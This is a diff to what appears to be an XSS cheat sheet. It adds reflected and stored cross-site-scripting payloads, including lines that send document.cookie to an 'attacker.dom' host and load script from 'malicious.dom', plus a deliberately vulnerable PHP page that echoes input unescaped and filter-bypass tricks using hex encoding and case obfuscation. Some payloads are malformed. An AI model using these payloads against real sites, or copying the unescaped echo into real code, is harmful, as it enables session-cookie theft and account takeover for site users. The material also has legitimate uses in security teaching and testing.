@@ -1,6 +1,14 @@
 Cross-Site-Scripting
 XSS
 
+URL-shortening services
+goo.gl
+tinyurl.com
+bit.ly
+tiny.cc
+badurl.com
+
+
 <script>code</script>
 "<script>code</script>
 "'<script>code</script>
@@ -26,15 +34,55 @@ setTimeout(function(){alert("call < function after > milliseconds",15000);//
 setInterval(alert("call < stored function every > milliseconds",15000);//
 
 REFLECTED XSS
-/<script>alert(document.domain)</script>
-/<iframe>document.cookie</iframe>
+<script>alert(document.domain)</script>
+<iframe>document.cookie</iframe>
 http://url.dom/#the%20rest%20of%20this%20line%20is%20read%20as%20the%20input%20value%20for%20each%20window.location.hash
-/<script>console.log("debug me");</script>
+<script>console.log("debug me");</script>
 <script>eval('var x=1;alert(x)');
+<iframe src="https://malicious.dom" height="100%" width="100%"></iframe>
+<SCRIPT SRC=https://malicious.dom/xss.js></SCRIPT>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 
 STORED XSS
 <iframe>parent.document.cookie</iframe>
 img=new Image();img.src="http://attacker.dom?cookie="+document.cookie;
 <script>img=new Image();img.src="http://attacker.dom?cookie="+document.cookie<script>
 <img src=location.here onerror="alert(document.cookie)"/>
+<IMG SRC=javascript:alert('XSS')>
 <script>console.log("VALUE x:");console.log(x);console.log("VALUE y:");console.log(y);</script>]
+
+
+Simple generic XSS-vulnerable page example
+->xss.html
+<html>
+ <head>
+ <title>Google</title>
+ </head>
+  <body>
+ 
+   <form method="get" action="search.php">
+   Google: 
+   <input type="text" name="search" size="20" />
+   <input type="submit" class="button" value="Submit" />
+   </form>
+ 
+ </body>
+</html>
+->xss.php
+<?php echo $_GET['search']; ?>
+For which an intended GET request would be http://localhost/xss.php?search=anything
+A reflected XSS url would be http://localhost/xss.php?search=<script>alert(document.cookie());</script>
+
+
+XSS filter bypass methods
+HEX encoding
+Obfuscation
+magic_quotes_gpc=ON bypass (php-specific)
+
+HEX encoding
+?param=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%28%29%29%3b%3c%2f%73%63%72%69%70%74%3e
+	-hex encoding of <script>alert(document.cookie());</script>
+	
+Obfuscation
+"><sCrIpT>alert('turtles');</ScRiPt>
+	-javascript case-insensitive
